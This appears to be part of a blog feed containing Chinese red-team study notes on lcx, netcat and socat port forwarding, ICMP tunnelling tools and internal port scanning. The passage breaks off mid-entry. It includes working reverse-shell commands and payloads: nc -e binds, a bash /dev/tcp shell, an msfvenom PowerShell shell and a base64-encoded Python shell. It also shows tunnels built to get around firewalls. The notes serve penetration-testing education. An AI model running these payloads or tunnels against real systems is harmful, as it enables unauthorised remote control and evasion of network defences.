    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】7、lcx、netcat和socat的使用</title>
      <link href="//210528-130449.html"/>
      <url>//210528-130449.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、lcx-使用"><a href="#1、lcx-使用" class="headerlink" title="1、lcx 使用"></a>1、lcx 使用</h2><p>lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li>内网端口转发</li></ul><pre class="line-numbers language-none"><code class="language-none">内网失陷主机lcx.exe -slave rhost rport lhost lport公网代理主机lcx.exe -listen lport1 lport2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">内网失陷主机lcx.exe -slave 123.123.123.123 4444 127.0.0.1 3389公网代理主机lcx.exe -listen 4444 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在建立连接后，访问公网代理主机的 5555 端口就能访问到内网失陷主机的 3389 端口了。</p><ul><li>本地端口映射</li></ul><p>如果目标主机不能出网，这时可以利用内网中能够出网的主机，将其不能出网的主机端口映射到自身上，再借助端口转发到公网进行访问。</p><pre class="line-numbers language-none"><code class="language-none">lcx.exe -tran 53 &lt;目标主机 IP 地址&gt; 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>内网端口转发</li></ul><pre class="line-numbers language-none"><code class="language-none">内网失陷主机.&#x2F;portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 &lt;公网主机 IP&gt; -p2 4444公网代理主机.&#x2F;portmap -m 2 -p1 4444 -h2 &lt;公网主机 IP&gt; -p2 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时访问公网主机 IP 的 5555 端口，就会访问到内网失陷主机的 22 端口了。</p><h2 id="2、netcat-使用"><a href="#2、netcat-使用" class="headerlink" title="2、netcat 使用"></a>2、netcat 使用</h2><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><p>nc 全称 netcat，它的功能很多，这里简单记录下两个常用的功能，其他的比如文件传输、端口扫描等等的就不介绍了，毕竟平时使用频率有一说一还是比较少的。</p><pre class="line-numbers language-none"><code class="language-none">-l 开启监听状态-v 显示详细信息-p 指定监听的本地端口-k 客户端断掉连接时，服务端依然保持运行-e 将传入的信息以命令执行-n 直接使用 IP 地址，不进行 dns 解析过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="获取-banner-信息"><a href="#获取-banner-信息" class="headerlink" title="获取 banner 信息"></a>获取 banner 信息</h3><p>个人觉着最常用的功能，这个不仅可以用来查看 banner 信息，还能用来判断端口是否开放。</p><pre class="line-numbers language-none"><code class="language-none">nc -vv rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; nc -v 172.16.214.43 22Connection to 172.16.214.43 port 22 [tcp&#x2F;ssh] succeeded!SSH-2.0-OpenSSH_8.4p1 Debian-3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>个人觉着这个也是最常用的功能，可以使用 -e 指定 /bin/bash 进行反弹，也可以直接 -c 指定 bash 或者 cmd</p><p><strong>-e 指定反弹 shell</strong></p><pre class="line-numbers language-none"><code class="language-none"># 失陷主机nc -lvp lport -e &#x2F;bin&#x2F;bash# linux 主机nc -lvp lport -e c:\windows\system32\cmd.exe # windows 主机# 控制端nc rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># 失陷主机&gt; nc -lvp 4444 -e &#x2F;bin&#x2F;bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60628# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp&#x2F;krb524] succeeded!whoamiroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>-c 指定反弹 shell</strong></p><pre class="line-numbers language-none"><code class="language-none"># 失陷主机nc -lvp lprot -c bash# linux 主机nc -lvp lport -c cmd # windows 主机# 控制端nc rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># 失陷主机&gt; nc -lvp 4444 -c bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60635# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp&#x2F;krb524] succeeded!whoamiroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结合其他语言进行反弹 shell</strong></p><pre class="line-numbers language-none"><code class="language-none"># 失陷主机bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;rhost&#x2F;rport 0&gt;&amp;1# 控制端nc -lvp lprot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># 失陷主机&gt; bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.214.43&#x2F;4444 0&gt;&amp;1# 控制端&gt; nc -lp 4444root@ubuntu:~# whoamiwhoamiroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了 bash 也可以使用其他的语言进行反弹 shell，这里可以使用 msfvenom 生成反弹 shell，操作起来比较方便，使用 <code>msfvenom -l payload | grep &quot;cmd/&quot;</code>可查看可使用的 payload</p><p>比如使用 <code>cmd/windows/reverse_powershell</code> 这个 payload</p><pre class="line-numbers language-none"><code class="language-none"># 控制端&gt; msfvenom -p cmd&#x2F;windows&#x2F;reverse_powershell lhost&#x3D;172.16.214.43 lport&#x3D;4444[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 1586 bytespowershell -w hidden -nop -c $a&#x3D;&#39;172.16.214.43&#39;;$b&#x3D;4444;$c&#x3D;New-Object system.net.sockets.tcpclient;$nb&#x3D;New-Object System.Byte[] $c.ReceiveBufferSize;$ob&#x3D;New-Object System.Byte[] 65536;$eb&#x3D;New-Object System.Byte[] 65536;$e&#x3D;new-object System.Text.UTF8Encoding;$p&#x3D;New-Object System.Diagnostics.Process;$p.StartInfo.FileName&#x3D;&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput&#x3D;1;$p.StartInfo.RedirectStandardOutput&#x3D;1;$p.StartInfo.RedirectStandardError&#x3D;1;$p.StartInfo.UseShellExecute&#x3D;0;$q&#x3D;$p.Start();$is&#x3D;$p.StandardInput;$os&#x3D;$p.StandardOutput;$es&#x3D;$p.StandardError;$osread&#x3D;$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread&#x3D;$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s&#x3D;$c.GetStream();while ($true) &#123;    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) &#123;      $r&#x3D;$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread&#x3D;$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    &#125;    if ($esread.IsCompleted -and $esread.Result -ne 0) &#123;      $r&#x3D;$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread&#x3D;$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    &#125;    if ($s.DataAvailable) &#123;      $r&#x3D;$s.Read($nb,0,$nb.Length);      if ($r -lt 1) &#123;          break;      &#125; else &#123;          $str&#x3D;$e.GetString($nb,0,$r);          $is.write($str);      &#125;    &#125;    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) &#123;        break;    &#125;    if ($p.ExitCode -ne $null) &#123;        break;    &#125;&#125;&gt; nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-05-28_12-36-45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>再比如使用 <code>cmd/unix/reverse_python</code> 这个payload</p><pre class="line-numbers language-none"><code class="language-none"># 控制端&gt; msfvenom -p cmd&#x2F;unix&#x2F;reverse_python lhost&#x3D;172.16.214.43 lport&#x3D;4444[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 505 bytespython -c &quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCAgICwgc3VicHJvY2VzcyAgICwgb3M7ICAgICAgaG9zdD0iMTcyLjE2LjIxNC40MyI7ICAgICAgcG9ydD00NDQ0OyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICBzLmNvbm5lY3QoKGhvc3QgICAsIHBvcnQpKTsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsIDApOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgMSk7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAyKTsgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik&#x3D;&#39;)[0]))&quot;&gt; nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样将生成的 payload 复制到失陷主机上运行，即可收到反弹回来的 shell，当然前提是目标主机安装了 python</p><h2 id="3、socat-使用"><a href="#3、socat-使用" class="headerlink" title="3、socat 使用"></a>3、socat 使用</h2><p>socat 下载地址：<a href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>，或者直接使用 <code>apt-get install socat</code> 安装，Mac 可使用 <code>brew install socat</code> 安装。</p><p>socat 全称 socket cat，可以视为 nc 的加强版，不过平时感觉 nc 也够用了，但是 nc 现在貌似会被杀软杀掉，而且貌似 nc 很久没更新了，反正多掌握点知识没坏处。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><strong>读取文件</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt; socat - .&#x2F;test.txt  # 相对路径读取test&gt; socat - &#x2F;tmp&#x2F;test.txt# 绝对路径读取test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>写入文件</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt; echo &quot;hello world&quot; | socat - .&#x2F;test.txt&gt; socat - .&#x2F;test.txttesthello world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h3><p><strong>连接远程端口</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt; socat - TCP:172.16.214.1:22SSH-2.0-OpenSSH_7.4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>监听端口</strong></p><pre class="line-numbers language-none"><code class="language-none">socat - TCP-LISTEN:8002<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>转发 TCP 端口</strong></p><p>个人觉着这个是比较常用到的功能，在使用 CS 做重定向器时，就可以使用 socat 进行端口的转发。</p><pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样在访问当前主机的 80 端口时，就会访问到 123.123.123.123 的 80 端口了，也可以使用 -d 调整输出信息的详细程度，最多使用四个 d，推荐使用两个，即 -dd</p><pre class="line-numbers language-none"><code class="language-none">socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>转发 UDP 端口</strong></p><p>和上面一样，将 TCP 改成 UDP 即可</p><pre class="line-numbers language-none"><code class="language-none">socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>NAT 映射</strong></p><p>通过 socat 可以将内网端口映射到公网上，不过这种场景还是更推荐用 frp</p><pre class="line-numbers language-none"><code class="language-none"># 内网主机socat tcp:123.123.123.123:4444 tcp:127.0.0.1:3389# 公网主机socat tcp-listen:4444 tcp-listen:5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时访问公网主机的 5555 端口就可以访问到内网主机的 3389 端口了</p><p>考虑到 socat 的其他功能平时也很少使用到，这里就不过多介绍了，网上相关文章也有很多，在此就不赘述了。</p><blockquote><p>参考链接：</p><p><a href="https://www.sqlsec.com/2019/10/nc.html">https://www.sqlsec.com/2019/10/nc.html</a></p><p><a href="https://www.hi-linux.com/posts/61543.html">https://www.hi-linux.com/posts/61543.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】6、ICMP隧道工具使用</title>
      <link href="//210407-183605.html"/>
      <url>//210407-183605.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最常见的场景就是使用 ping 命令，而且一般防火墙都不会禁止 ping 数据包。</p><p>因此我们便可以将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而绕过防火墙的限制。</p><h2 id="2、建立-ICMP-隧道工具"><a href="#2、建立-ICMP-隧道工具" class="headerlink" title="2、建立 ICMP 隧道工具"></a>2、建立 ICMP 隧道工具</h2><p>用于建立 ICMP 隧道的工具常见有：ptunnel、icmpsh、icmptunnel 等</p><h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>ptunnel 全称 PingTunnel，Kali 下自带该工具，Linux 下安装过程如下：</p><pre class="line-numbers language-none"><code class="language-none">yum -y install byaccyum -y install flex bison#安装libpcap依赖库wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;libpcap-1.9.0.tar.gztar -xzvf libpcap-1.9.0.tar.gzcd libpcap-1.9.0.&#x2F;configuremake &amp;&amp; make install#安装PingTunnelwget http:&#x2F;&#x2F;www.cs.uit.no&#x2F;~daniels&#x2F;PingTunnel&#x2F;PingTunnel-0.72.tar.gztar -xzvf PingTunnel-0.72.tar.gzcd PingTunnelmake &amp;&amp; make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ptunnel 常用命令介绍：</p><pre class="line-numbers language-none"><code class="language-none">-p: 指定跳板服务器 IP 地址-lp: 监听本地 TCP 端口-da: 指定访问目标的内网 IP 地址-dp: 指定访问目标的端口-m: 设置隧道最大并发数-v: 输入内容详细级别（-1到4，其中-1为无输出，4为全部输出）-udp: 切换使用UDP代替ICMP，代理将监听端口53（必须是 root 权限）-x: 设置隧道密码，防止滥用（客户端和代理端必须相同）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目前有这样的一个场景，当前已经拿下了一台外网 Web Linux 服务器，想通过它利用 ICMP 协议连接内网的一台已经开启远程桌面的 Windows ，网络结构简化如下。</p><pre class="line-numbers language-none"><code class="language-none">Kali 攻击机       172.16.214.6 (外网)||Linux Web 跳板机  172.16.214.5  (外网)|                192.168.7.5   (内网)||Win RDP 目标机    192.168.7.110 (内网)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 Kali 攻击机上执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-p  指定跳板机外网IP-lp 指定本机的监听端口-da 指定目标机的内网IP-dp 指定目标机的端口-x 设置隧道密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 Linux Web 跳板机上执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">ptunnel -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_14-46-46.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git #下载工具apt-get install python-impacket # 安装依赖，或者 pip2 install impacketsysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1  #关闭本地ICMP应答<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>icmpsh 常用命令介绍：</p><pre class="line-numbers language-none"><code class="language-none">-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]-d milliseconds    请求时间间隔（毫秒）-o milliseconds    响应超时时间（毫秒）-s bytes           最大数据缓冲区大小（字节）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>目前有这样的一个场景，攻击机能通过 ICMP 协议访问到目标主机，但是目标上有防火墙，拒绝了敏感端口比如 22、3389 端口的访问，这个时候可以使用 icmpsh 利用 ICMP 协议建立反向 shell</p><pre class="line-numbers language-none"><code class="language-none">攻击机 IP：172.16.214.6目标机 IP：172.16.214.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在攻击机上运行：</p><pre class="line-numbers language-none"><code class="language-none">python2 icmpsh_m.py 172.16.214.6 172.16.214.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在目标机上运行</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;icmpsh.exe -t 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时在攻击机上可以看到通过 icmp 协议建立的 shell</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_15-43-51.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><p> icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;jamesbarlow&#x2F;icmptunnel.gitcd icmptunnelmake<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>目前有这样的一个场景，攻击者为 Linux，但由于目标存在状态防火墙或者使用了 NAT 导致无法获得 shell，此时可以通过 icmptunnel 绕过限制。</p><pre class="line-numbers language-none"><code class="language-none">攻击机 IP：172.16.214.6目标机 IP：172.16.214.5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在攻击机上运行：</p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all# 禁用 ICMP echo 回复，防止内核自己对ping包进行响应.&#x2F;icmptunnel -s# 开启服务端模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在攻击机上新开启一个终端运行：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.1 netmask 255.255.255.0# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在目标机上运行：</p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all.&#x2F;icmptunnel 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在目标机上新开启一个终端运行：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.2 netmask 255.255.255.0# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>至此，已经通过 ICMP 建立了一个点对点隧道。</p><p>在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。</p><pre class="line-numbers language-none"><code class="language-none">ssh root@10.0.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_16-35-09.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/7875">https://xz.aliyun.com/t/7875</a></p><p><a href="https://www.freebuf.com/sectool/210450.html">https://www.freebuf.com/sectool/210450.html</a></p><p><a href="https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/">https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】域内主机端口探测的一些方法总结</title>
      <link href="//210317-201858.html"/>
      <url>//210317-201858.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>注：本文中的工具均来源自互联网，后门自查。</p></blockquote><p>在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。</p><h2 id="1、Telnet"><a href="#1、Telnet" class="headerlink" title="1、Telnet"></a>1、Telnet</h2><p>如果想探测某台主机的某个端口是否开放，直接使用 telnet 命令是最方便的。</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;telnet dc 80正在连接dc...无法打开到主机的连接。 在端口 80: 连接失败C:\Users\daniel10&gt;telnet 192.168.7.7 443正在连接192.168.7.7...无法打开到主机的连接。 在端口 443: 连接失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、nc"><a href="#2、nc" class="headerlink" title="2、nc"></a>2、nc</h2><p>素有瑞士军刀之称的 nc 也是可以拿来做端口探测的。</p><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><pre class="line-numbers language-none"><code class="language-none">nc.exe -vv 192.168.7.7 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;nc.exe -vv 192.168.7.7 3389DNS fwd&#x2F;rev mismatch: DC !&#x3D; DC.teamssix.comDC [192.168.7.7] 3389 (ms-wbt-server) open<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>拿来进行多个端口扫描也是可以的，就是扫描速度有点慢</p><pre class="line-numbers language-none"><code class="language-none">nc.exe -rz -w 2 -vv 192.168.7.7 0-65535-r 随机指定本地与远端主机的通信端口-z 使用0输入&#x2F;输出模式，只在扫描通信端口时使用-w&lt;超时秒数&gt; 设置等待连线的时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;nc.exe -rz -w 2 -vv 192.168.7.7 443-445DNS fwd&#x2F;rev mismatch: DC !&#x3D; DC.teamssix.comDC [192.168.7.7] 444 (?): TIMEDOUTDC [192.168.7.7] 443 (https): TIMEDOUTDC [192.168.7.7] 445 (microsoft-ds) opensent 0, rcvd 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、fscan"><a href="#3、fscan" class="headerlink" title="3、fscan"></a>3、fscan</h2><p>影舞者大佬写的一款工具，使用起来感觉很是方便，项目地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><pre class="line-numbers language-none"><code class="language-none">fscan.exe -h 192.168.7.7 -p 22,445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;fscan.exe -h 192.168.7.7 -p 22,445   ___                              _  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#39;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;&#x2F; &#x2F;_\\_____\__ \ (__| | | (_| | (__|   &lt;\____&#x2F;     |___&#x2F;\___|_|  \__,_|\___|_|\_\                     fscan version: 1.5.1scan start(icmp) Target &#39;192.168.7.7&#39; is aliveicmp alive hosts len is: 1192.168.7.7:445 open[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)scan end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、ScanLine"><a href="#4、ScanLine" class="headerlink" title="4、ScanLine"></a>4、ScanLine</h2><p>McAfee 出品的一款经典的端口扫描工具，ScanLine 项目地址：<a href="www.mcafee.com/us/downloads/free-tools/termsofuse.aspx">www.mcafee.com/us/downloads/free-tools/termsofuse.aspx</a></p><p>但是项目地址的下载按钮貌似失效了，其他的下载地址：<a href="https://www.lanzous.com/i32zncf">https://www.lanzous.com/i32zncf</a></p><pre class="line-numbers language-none"><code class="language-none">scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7ScanLine (TM) 1.01Copyright (c) Foundstone, Inc. 2002http:&#x2F;&#x2F;www.foundstone.comScan of 1 IP started at Wed Feb 24 21:31:11 2021-------------------------------------------------------------------------------192.168.7.7Responds with ICMP unreachable: NoTCP ports: 445 3389-------------------------------------------------------------------------------Scan finished at Wed Feb 24 21:31:15 20211 IP and 4 ports scanned in 0 hours 0 mins 4.03 secs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、S-扫描器"><a href="#5、S-扫描器" class="headerlink" title="5、S 扫描器"></a>5、S 